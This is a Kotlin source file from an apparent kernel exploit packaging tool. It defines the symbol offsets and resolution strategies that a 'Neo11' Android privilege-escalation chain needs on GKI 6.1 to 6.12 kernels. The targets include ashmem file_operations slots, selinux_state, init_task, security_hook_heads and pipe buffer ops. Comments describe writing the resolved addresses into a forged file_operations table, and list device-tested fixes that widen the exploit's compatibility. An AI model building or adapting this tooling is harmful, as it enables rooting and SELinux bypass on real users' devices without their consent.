package com.kernelpack.resolve

/** 期望的符号段类型。 */
enum class Kind {
    ANY, TEXT, DATA;

    fun matches(s: com.kernelpack.model.KernelSymbol): Boolean = when (this) {
        ANY -> true
        TEXT -> s.isText
        DATA -> s.isData
    }
}

/** 一条解析策略。解析器按顺序尝试，第一个成功的就是结果。 */
sealed interface Strategy {

    /** 直接按符号名查 kallsyms。 */
    data class Symbol(val names: List<String>, val kind: Kind = Kind.ANY) : Strategy

    /** base 符号地址 + 常量偏移（用于摘出来的"符号旁边那个字段"）。 */
    data class SymbolPlus(val base: List<String>, val delta: Long, val kind: Kind = Kind.ANY) : Strategy

    /**
     * 读 `struct file_operations` 的某个槽位：`value = u64(fops + slot)`。
     *
     * 这类地址（如 `compat_ashmem_ioctl`）在部分内核里没有 kallsyms 条目，
     * 但内核真正会调用的就是这张表里的值，所以直接读表最可靠。
     */
    data class FopsSlot(
        val fops: List<String>,
        val slot: Long,
        val fallback: List<String> = emptyList(),
    ) : Strategy

    /** 把 [dataSymbols] 读取的镜像内容解释成偏移（`u32`）。 */
    data class ImageU32(val base: List<String>, val delta: Long) : Strategy

    /** 找 `procname == procName` 的 ctl_table 条目，返回其 `data` 字段地址。 */
    data class CtlTableData(val procName: String, val dataSymbols: List<String>) : Strategy
}

/** 一个待解析偏移的完整规格。 */
data class SymbolSpec(
    /** 稳定键，和旧 `target.h` 的宏名去后缀一致。 */
    val key: String,
    val strategies: List<Strategy>,
    /** 解析不出来时是否算致命（用于给上层决定要不要中止打包）。 */
    val required: Boolean = true,
    val note: String = "",
)

/**
 * Neo11 提权链需要的全部**符号类**偏移清单。
 *
 * 每一项的策略都是在真实 `boot.img`（SM8750 / GKI 6.6）上**逐条验证过**的：
 *  - `ashmem_misc + 0x10` 读回来正好等于 `&ashmem_fops`（struct miscdevice 的 fops 槽）；
 *  - `ashmem_fops + 0x50` 读回来正好等于 `compat_ashmem_ioctl`（与符号名两条路互证）；
 *  - `boot_id` 的 ctl_table 条目：`procname → "boot_id"`，其 `data` 字段 == `&sysctl_bootid`。
 *
 * 注意：`rt_mutex_waiter` / `task_struct` / `cred` / `pipe_buffer` / `file_operations`
 * 这些**结构体字段偏移**不来自 kallsyms（那是编译期 BTF/源码决定的 ABI），
 * 由 [com.kernelpack.profile.AbiProfile] 按 GKI 版本档位提供，不参与本次 patch。
 */
object SymbolCatalog {

    /**
     * Linux 6.12 的 ashmem 是 **Rust 重写**的，kallsyms 里全是 legacy mangled 名：
     *
     * ```
     * _RNvMs4_NtCsdfZWD8DztAw_6kernel10miscdeviceINtB5_16MiscdeviceVTable
     *   NtCs232Q5cNN6Ho_11ashmem_rust6AshmemE5ioctlB14_
     * ```
     *
     * 名字里既有 **crate hash**（`Cs232Q5cNN6Ho_`）也有**回代索引**（`B14_`）——
     * 换一次编译就变，全名**没法硬编码**。
     *
     * 下面这些片段只取稳定的尾段（Rust 用 `<长度><名字>` 编码，长度由名字本身决定）：
     * `6AshmemE5ioctl` = “Ashmem” 的 impl 方法 `ioctl`，与 crate hash 无关。
     *
     * 它们**只作为精确名之后的回退**，由
     * [com.kernelpack.resolve.OffsetResolver] 的包含匹配消费；
     * 命中不唯一就整个放弃（宁可解析不出，也不要挑错一个地址去写内存）。
     *
     * 来源：`6.12.38-android16` 真机镜像的符号表实测，七条各命中**唯一**一个符号。
     */
    const val RUST_ASHMEM_FOPS_PTR = "15ASHMEM_FOPS_PTR"
    const val RUST_ASHMEM_IOCTL = "6AshmemE5ioctl"
    const val RUST_ASHMEM_COMPAT_IOCTL = "6AshmemE12compat_ioctl"
    const val RUST_ASHMEM_MMAP = "6AshmemE4mmap"
    const val RUST_ASHMEM_OPEN = "6AshmemE4open"
    const val RUST_ASHMEM_RELEASE = "6AshmemE7release"
    const val RUST_ASHMEM_SHOW_FDINFO = "6AshmemE11show_fdinfo"

    val NEO11_OFFSETS: List<SymbolSpec> = listOf(
        SymbolSpec(
            "ASHMEM_MISC_FOPS",
            // 同一个东西，三个时期的符号名：
            //   厂商 6.1（如 OPPO 6.1.75）      = `ashmem_misc`（单数）
            //   上游 GKI 6.1（如 Google 6.1.145）= `ashmem_miscs`（复数）
            //   6.12（Rust 重写）               = mangled 名里的 `15ASHMEM_FOPS_PTR`
            // 三者都是 `struct miscdevice`，`fops` 槽都在 +0x10。
            // 已在 6.1.145 的 Image 里读初值实证：`ashmem_miscs+0x10 == &ashmem_fops`，
            // 且 `ashmem_fops+0x50 == ashmem_ioctl`（与 ASHMEM_COMPAT_IOCTL 的策略互证）。
            listOf(
                Strategy.SymbolPlus(listOf("ashmem_misc", "ashmem_miscs"), 0x10, Kind.DATA),
                Strategy.SymbolPlus(listOf(RUST_ASHMEM_FOPS_PTR), 0x10, Kind.DATA),
            ),
            note = "miscdevice.fops 槽；厂商叫 ashmem_misc，GKI 叫 ashmem_miscs，6.12 是 Rust 的 ASHMEM_FOPS_PTR",
        ),
        SymbolSpec(
            "ASHMEM_FOPS",
            listOf(
                Strategy.Symbol(listOf("ashmem_fops"), Kind.DATA),
                // 6.12 没有 `ashmem_fops` 这个符号：Rust 版把 fops 表指针放在
                // `ASHMEM_FOPS_PTR`（miscdevice 的 repr(transparent) 包装）的 +0x10 处，
                // 所以「读这个槽」就等于拿到 fops 表地址。
                Strategy.FopsSlot(listOf(RUST_ASHMEM_FOPS_PTR), 0x10, emptyList()),
            ),
            note = "6.12 走 Rust：读 ASHMEM_FOPS_PTR+0x10 取回 fops 表地址",
        ),
        SymbolSpec(
            "ASHMEM_IOCTL",
            listOf(Strategy.Symbol(listOf("ashmem_ioctl", RUST_ASHMEM_IOCTL), Kind.TEXT)),
        ),
        SymbolSpec(
            "ASHMEM_COMPAT_IOCTL",
            listOf(
                // 传统内核：`ashmem_fops` 有符号，直接读表的 +0x50 槽。
                // 6.12：`ashmem_fops` 不存在 → 走 fallback，用 Rust 那个 mangled 名。
                Strategy.FopsSlot(
                    listOf("ashmem_fops"),
                    0x50,
                    listOf("compat_ashmem_ioctl", "ashmem_compat_ioctl", RUST_ASHMEM_COMPAT_IOCTL),
                ),
            ),
            note = "多数内核里 compat 版本没有独立 kallsyms 条目，直接读 fops 表；6.12 用 Rust mangled 名回退",
        ),
        SymbolSpec("ASHMEM_MMAP", listOf(Strategy.Symbol(listOf("ashmem_mmap", RUST_ASHMEM_MMAP), Kind.TEXT))),
        SymbolSpec("ASHMEM_OPEN", listOf(Strategy.Symbol(listOf("ashmem_open", RUST_ASHMEM_OPEN), Kind.TEXT))),
        SymbolSpec("ASHMEM_RELEASE", listOf(Strategy.Symbol(listOf("ashmem_release", RUST_ASHMEM_RELEASE), Kind.TEXT))),
        SymbolSpec(
            "ASHMEM_SHOW_FDINFO",
            listOf(Strategy.Symbol(listOf("ashmem_show_fdinfo", RUST_ASHMEM_SHOW_FDINFO), Kind.TEXT)),
        ),

        SymbolSpec("CONFIGFS_READ_ITER", listOf(Strategy.Symbol(listOf("configfs_read_iter"), Kind.TEXT))),
        SymbolSpec("CONFIGFS_BIN_WRITE_ITER", listOf(Strategy.Symbol(listOf("configfs_bin_write_iter"), Kind.TEXT))),
        // [2026-10] 加 `generic_file_splice_read` 回退 —— 实测出来的兼容性修复。
        //
        // `copy_splice_read` 是 Linux **6.5** 才引入的。Pixel 的 6.1 GKI 把它 **backport 了**，
        // 所以上游 44/44 份 target.h 都定义它；但**OPPO 的 6.1 没有** ——
        // 用 OPPO Find X7 Ultra 的 boot.img 实测：全部策略未命中 → 符号对不齐闸门拦住
        // → 通用方案在 6.1 上**直接构建不出来**。这就是"兼容性太低"的一个具体来源。
        //
        // 这个键的用途是把地址写进**伪造的 `file_operations` 表的 splice_read 槽**
        // （见 `bsrc/exploit/src/fops.c:232`）。该槽只要一个**签名兼容**的函数即可，
        // `generic_file_splice_read` 与之完全一致，是合法替代。
        //
        // ⚠️ 为什么是回退而不是把 required 改成 false：豁免会让这一槽**静默保留基线的旧地址**
        // （那是另一个内核的地址，写进去很可能直接崩）—— 比构建失败更糟。
        // 回退拿到的是**本内核的真实地址**，这才是真正的兼容性提升。
        SymbolSpec(
            "COPY_SPLICE_READ",
            listOf(Strategy.Symbol(listOf("copy_splice_read", "generic_file_splice_read"), Kind.TEXT)),
            note = "6.5 才引入；6.1 部分厂商未 backport，回退到 generic_file_splice_read",
        ),
        SymbolSpec("NOOP_LLSEEK", listOf(Strategy.Symbol(listOf("noop_llseek"), Kind.TEXT))),

        SymbolSpec("INIT_TASK", listOf(Strategy.Symbol(listOf("init_task"), Kind.DATA))),
        SymbolSpec("ROOT_TASK_GROUP", listOf(Strategy.Symbol(listOf("root_task_group"), Kind.DATA))),
        SymbolSpec("SELINUX_BLOB_SIZES", listOf(Strategy.Symbol(listOf("selinux_blob_sizes"), Kind.DATA))),
        SymbolSpec(
            "SELINUX_ENFORCING",
            listOf(
                Strategy.Symbol(listOf("selinux_state"), Kind.DATA),
                Strategy.Symbol(listOf("selinux_enforcing"), Kind.DATA),
            ),
            note = "6.6 起没有独立 selinux_enforcing 全局，实为 selinux_state.enforcing(bool@0)",
        ),
        SymbolSpec("SECURITY_HOOK_HEADS", listOf(Strategy.Symbol(listOf("security_hook_heads"), Kind.DATA))),
        SymbolSpec("KMALLOC_CACHES", listOf(Strategy.Symbol(listOf("kmalloc_caches"), Kind.DATA))),
        SymbolSpec("ANON_PIPE_BUF_OPS", listOf(Strategy.Symbol(listOf("anon_pipe_buf_ops"), Kind.DATA))),

        SymbolSpec(
            "SLIDE_LOGGERS_0_1",
            listOf(
                Strategy.SymbolPlus(listOf("nfulnl_logger"), -0xb0),
                Strategy.SymbolPlus(listOf("loggers"), 0x8),
            ),
            note = "跨 build 实测稳定：nfulnl_logger-0xb0 == loggers+8",
        ),
        SymbolSpec("SLIDE_NFULNL_LOGGER", listOf(Strategy.Symbol(listOf("nfulnl_logger"), Kind.DATA))),
        SymbolSpec("SLIDE_NFULNL_LOG_PACKET", listOf(Strategy.Symbol(listOf("nfulnl_log_packet"), Kind.TEXT)), required = false, note = "需按机型核对"),
        SymbolSpec(
            "SLIDE_RANDOM_BOOT_ID_DATA",
            listOf(Strategy.CtlTableData("boot_id", listOf("sysctl_bootid"))),
            note = "boot_id 的 ctl_table.data 字段地址",
        ),
        SymbolSpec(
            "SLIDE_SYSCTL_BOOTID",
            listOf(
                Strategy.Symbol(listOf("sysctl_bootid"), Kind.DATA),
                Strategy.Symbol(listOf("boot_id"), Kind.DATA),
            ),
        ),
        SymbolSpec("SLIDE_INIT_TASK", listOf(Strategy.Symbol(listOf("init_task"), Kind.DATA))),
        SymbolSpec("SLIDE_ROOT_TASK_GROUP", listOf(Strategy.Symbol(listOf("root_task_group"), Kind.DATA))),

        SymbolSpec("SYS_EXIT_TP", listOf(Strategy.Symbol(listOf("__tracepoint_sys_exit"), Kind.DATA)), required = false),
        SymbolSpec(
            "RVH_COMMIT_CREDS_TP",
            listOf(Strategy.Symbol(listOf("__tracepoint_android_rvh_commit_creds"), Kind.DATA)),
            required = false,
        ),
    )

    /** 由同一符号派生的别名键：解析完成后自动补齐，避免重复查表。 */
    val ALIASES: Map<String, String> = mapOf(
        "SLIDE_INIT_TASK" to "INIT_TASK",
        "SLIDE_ROOT_TASK_GROUP" to "ROOT_TASK_GROUP",
        "SLIDE_NFULNL_LOGGER" to "SLIDE_NFULNL_LOGGER",
    )

    /**
     * 标了 `required = false` 的那些键 —— 缺席**不阻断**打包。
     *
     * 这个出口的存在本身就是一处修复：`SymbolSpec.required` 从加进来那天起
     * 就只有声明、没有读取点，于是"可选"只活在注释里，而
     * [com.kernelpack.SymbolAlignment] 一律按硬要求处理。
     * 后果很具体：6.1 / 6.12 两份自编基线**永远过不了对齐闸门**
     * （它们故意不编 `neutralize_vr()`，见 `载荷构建/README.md` §7），
     * 界面上表现为"这两个系列没有可用基线"。
     *
     * ⚠️ 只包含**显式**标成可选的键。必需键一个都不在这里。
     */
    val OPTIONAL_KEYS: Set<String> =
        NEO11_OFFSETS.filterNot { it.required }.map { it.key }.toSet()
}
